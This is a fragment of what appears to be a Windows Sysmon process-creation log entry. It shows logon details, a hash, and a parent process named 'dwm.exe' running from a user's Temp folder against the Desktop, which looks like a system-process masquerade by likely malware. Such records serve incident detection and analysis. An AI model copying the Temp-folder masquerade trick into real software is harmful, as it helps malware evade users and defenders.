LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
